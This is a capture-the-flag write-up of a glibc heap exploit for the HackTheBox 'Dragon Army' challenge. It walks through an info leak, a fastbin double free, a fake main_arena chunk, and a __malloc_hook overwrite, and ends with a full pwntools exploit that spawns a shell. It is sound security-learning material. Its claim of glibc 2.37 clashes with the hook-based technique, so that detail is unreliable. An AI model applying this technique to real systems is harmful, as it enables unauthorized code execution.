(this is an old write up from when I was younger)
# RE & Finding The Vulnerabilities

- out of bounds read due to improper null termination:
![](https://i.imgur.com/pOu1CbA.png)
- since our input `isn't properly null terminated` when it's printed out when we input r3dDr4g3nst1str0f1 plus more data to stuff the buffer, when it prints out our input back to us it contains a memory leak.

- and we can obviously call malloc and free at will so we have ourselves a `fastbin dup` (double free)
---
```d
pwndbg> fastbins  
fastbins  
0x30: 0x55b9ed1f2450 —▸ 0x55b9ed1f2420 ◂— 0xcafebabe  
pwndbg> heap  
Allocated chunk | PREV_INUSE  
Addr: 0x55b9ed1f1000  
Size: 0x410 (with flag bits: 0x411)  
  
Allocated chunk | PREV_INUSE  
Addr: 0x55b9ed1f1410  
Size: 0x1010 (with flag bits: 0x1011)  
  
Free chunk (fastbins) | PREV_INUSE  
Addr: 0x55b9ed1f2420  
Size: 0x30 (with flag bits: 0x31)  
fd: 0xcafebabe  
  
Free chunk (fastbins) | PREV_INUSE  
Addr: 0x55b9ed1f2450  
Size: 0x30 (with flag bits: 0x31)  
fd: 0x55b9ed1f2420  
  
Top chunk | PREV_INUSE  
Addr: 0x55b9ed1f2480  
Size: 0x1fb80 (with flag bits: 0x1fb81)
```

- so we've corrupted the fd pointer, now what? what do we link it to, keep in mind the `glibc` version is pretty new, version 2.37 to be exact.

- finding the libc leak, lets create a script to leak addresses.
```python
#!/usr/bin/python3  
from pwn import *  
  
  
elf = context.binary = ELF("da", checksec=True)  
#context.log_level = "debug"  
  
  
def start():  
   if args.GDB:  
       return gdb.debug(elf.path, gdbscript=gs)  
   else:  
       return process(elf.path)  
  
  
add = 0  
while True:  
       io = start()  
       io.sendafter(b"Cast a magic spell to enhance your army's power: ", b"r3dDr4g3nst1str0f1" + b"A"*add)  
       io.recvuntil(b"Army's power has been buffed with spell: r3dDr4g3nst1str0f1"+b"A"*add)  
       leak = int.from_bytes(io.recvline().strip(),byteorder="little")  
       print(f"leak: {leak:#x}   |  using {add} A's")  
       add += 1  
       io.close()
```

now that we found what we wanted:
```python
io.sendafter(b"Cast a magic spell to enhance your army's power: ", b"r3dDr4g3nst1str0f1" + b"A"*38)  
io.recvuntil(b"Army's power has been buffed with spell: r3dDr4g3nst1str0f1" + b"A"*38)  
leak = int.from_bytes(io.recvline().strip(),byteorder="little")  
log.info(f"leak: {leak:#x}")  
  
libc.address = leak - (libc.sym.__GI__IO_fwrite+185)  
log.info(f"LIBC base: {libc.address:#x}")
```

- we rebase libc...
```python
libc.address = leak - (libc.sym.__GI__IO_fwrite+185)  
log.info(f"LIBC base: {libc.address:#x}")
```

- our wrapper functions:
```python
def malloc(size, data):  
   io.sendlineafter(b">> ", b"1")  
   io.sendlineafter(b"Dragon's length: ", str(size).encode())  
   io.sendlineafter(b"Name your dragon: ", data)  
  
  
def free(index):  
   io.sendlineafter(b">> ", b"2")  
   io.sendlineafter(b"Dragon of choice: ", index)
```


---

# Exploit Development
- it's important to note that 90% of this challenge was debugging.
- we can use the commands in our debugger (GDB): `arena`, `arenas`, `heap`, `fastbins`, `tel &main_arena` & `vis` for debugging the heap and looking at the memory.
	- we also utilize `dq` and `x` for examining memory


- overwrite the fastbin fd with a fake size field.
```python
malloc(0x28, b"A"*8)  
malloc(0x28, b"B"*8)  
  
free(b"0")  
free(b"1") 
free(b"0")

malloc(0x28, p64(0x61)) # fake size field 0x61
```
```
pwndbg> fastbins  
fastbins  
0x30: 0x61
```
![](https://i.imgur.com/RCxFcu6.png)

- request two more chunks overwriting 0x61 size field into the main arena.
```python
malloc(0x28, b"C"*8)  
malloc(0x28, b"D"*8)
```

- link the fake main arena chunk into the 0x60 fastbin.
```python
malloc(0x58, b"X"*8)  
malloc(0x58, b"Z"*8)

free(b"5")  
free(b"6")  
free(b"5")
```

- now before we do the next part lets talk about some glibc malloc source code:
```c
4355       victim = av->top;  
4356       size = chunksize (victim);  
4357  
4358       if (__glibc_unlikely (size > av->system_mem))  
4359         malloc_printerr ("malloc(): corrupted top size");  
4360  
4361       if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))  
4362         {  
4363           remainder_size = size - nb;  
4364           remainder = chunk_at_offset (victim, nb);  
4365           av->top = remainder;  
4366           set_head (victim, nb | PREV_INUSE |  
4367                     (av != &main_arena ? NON_MAIN_ARENA : 0));  
4368           set_head (remainder, remainder_size | PREV_INUSE);  
4369  
4370           check_malloced_chunk (av, victim, nb);  
4371           void *p = chunk2mem (victim);  
4372           alloc_perturb (p, bytes);  
4373           return p;  
4374         }  
4375  
4376       /* When we are using atomic ops to free fast chunks we can get  
4377          here for all block sizes.  */  
4378       else if (atomic_load_relaxed (&av->have_fastchunks))  
4379         {  
4380           malloc_consolidate (av);  
4381           /* restore original bin index */  
4382           if (in_smallbin_range (nb))  
4383             idx = smallbin_index (nb);  
4384           else  
4385             idx = largebin_index (nb);  
4386         }
```

- if we setup our next stage of our exploit like this:
```python
malloc(0x58, p64(libc.sym.main_arena + 0x10))
malloc(0x58, b"junk")
malloc(0x58, b"junk")
malloc(0x58, b"\x00"*64 + p64(libc.sym.__malloc_hook))
```
- any next call to malloc will fail and cause an EOF (end of file) and it'll segfault because we hit the else if block, we enter `malloc_consolidate`() and then it will crash because we segfault.

- why is this happening?
	- this is happening because the size is NOT greater or equal to nb+MINSIZE
	- the top chunk pointer in the arena gets size checked and we need to pass that size check, pretty simple.
```c
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
```
- we want to hit the if block and we want our size to be greater or equal to `nb+MINSIZE`.

- so lets review our last stage of the exploit.
```python
malloc(0x58, p64(libc.sym.main_arena + 0x10))  
malloc(0x58, b"junk")  
malloc(0x58, b"junk")  
malloc(0x58, b"\x00"*64 + p64(libc.sym.__malloc_hook-36))
malloc(0x50, b"B"*20 + p64(libc.address+0xe1fa1))
malloc(0x18, b"")
```
- this will link fake chunk into the 0x60 fastbin & overwrite the top pointer in the main arena.

- and we can use this to write to the malloc hook and achieve code execution dropping us into a shell using our one gadget.

- this part is us linking the fake chunk into the 0x60 fastbin, the two junk malloc calls are to ensure that the important chunk is up next.
```python
malloc(0x58, p64(libc.sym.main_arena + 0x10))  
malloc(0x58, b"junk")  
malloc(0x58, b"junk")  
```

![](https://i.imgur.com/M7As52c.png)
- here we see what it looks like when we only malloc that fake chunk `WITHOUT THE JUNK MALLOC CALLS` we wanna create two more malloc calls to ensure that the important chunk is up next.

- why `p64(__libc.sym.main_arena+0x10)`? what're we doing here?
	- since heads of the fastbins live in the main arena our distance is equal to the `main_arena+0x10` is where our fake chunk is.
- ![](https://i.imgur.com/F1YCe9R.png)
	- here we see us linking the fake chunk into the 0x60 fastbin
- ![](https://i.imgur.com/Go1JHRZ.png)
	- here we see the fake size field we made, so you now see why we're using main_arena+0x10.

```python
malloc(0x58, b"\x00"*64 + p64(libc.sym.__malloc_hook-36))
malloc(0x50, b"B"*20 + p64(libc.address+0xe1fa1))
malloc(0x18, b"")
```
- we wanna use a relative address to the malloc hook because if we do not and we write it we fail the size check as we talked about earlier.

```python
malloc(0x58, b"\x00"*64 + p64(libc.sym.__malloc_hook-36))
```
- we pad the buffer down with 64 null bytes to reach the top chunk pointer and we use `p64(libc.sym.__malloc_hook-36)` as our relative address which passes the size check.

- we know that the value at the address+8 has to pass the size check, let me show you how i found this value.

- also we know we wanna find a place before the malloc hook so we can overwrite the malloc hook in our next call to malloc so that's why we're subtracting from the malloc hook.

- and we use -36 because 28+8=36.
- below is how i found the value in GDB.
```d
pwndbg> x/gx ((void *)&__malloc_hook)-28 0x7fc6cd3b4b34 
<_IO_wide_data_0+244>:   0x0000000000007fc6
```

```python
malloc(0x50, b"B"*20 + p64(libc.address+0xe1fa1))
```
- now we pad the buffer down until we're writing directly to the malloc hook 

```python
malloc(0x18, b"")
```
- now we just trigger our one gadget with a call to malloc and we drop a shell!

![](https://i.imgur.com/iHtYiYh.png)
- Challenge: `HackTheBox Dragon Army`.
- Solves prior to me: 57, i am the 58th (hooray!).
- This challenge taught me a lot and it was pretty fun!

---
# Our Exploit Code:

```python
from pwn import *  
  
  
elf = context.binary = ELF("da", checksec=True)  
libc = elf.libc  
context.log_level = "debug"  
  
gs = """  
continue"""  
  
def start():  
   if args.GDB:  
       return gdb.debug(elf.path, gdbscript=gs)  
   else:  
       return process(elf.path)  
  
def pause():  
   if args.GDB:  
       io.gdb.interrupt_and_wait()  
  
io = start()  
io.timeout = 1  
  
io.sendafter(b"Cast a magic spell to enhance your army's power: ", b"r3dDr4g3nst1str0f1" + b"A"*38)  
io.recvuntil(b"Army's power has been buffed with spell: r3dDr4g3nst1str0f1" + b"A"*38)  
leak = int.from_bytes(io.recvline().strip(),byteorder="little")  
log.info(f"__GI__IO_fwrite() leak: {leak:#x}")  
  
libc.address = leak - (libc.sym.__GI__IO_fwrite+185)  
log.info(f"LIBC base: {libc.address:#x}")  
  
def malloc(size, data):  
   io.sendlineafter(b">> ", b"1")  
   io.sendlineafter(b"Dragon's length: ", str(size).encode())  
   io.sendlineafter(b"Name your dragon: ", data)  
  
  
def free(index):  
   io.sendlineafter(b">> ", b"2")  
   io.sendlineafter(b"Dragon of choice: ", index)  
  
  
malloc(0x28, b"A"*8)
malloc(0x28, b"B"*8) 
  
free(b"0")  
free(b"1")  
free(b"0")  
malloc(0x28, p64(0x61))


malloc(0x28, b"C"*8)
malloc(0x28, b"D"*8)


malloc(0x58, b"X"*8)  
malloc(0x58, b"Z"*8)

free(b"5")  
free(b"6")  
free(b"5")  

malloc(0x58, p64(libc.sym.main_arena + 0x10))  
malloc(0x58, b"junk")  
malloc(0x58, b"junk")  
malloc(0x58, b"\x00"*64 + p64(libc.sym.__malloc_hook-36)) 
malloc(0x50, b"B"*20 + p64(libc.address+0xe1fa1)) 
malloc(0x18, b"")
  
io.interactive()
```



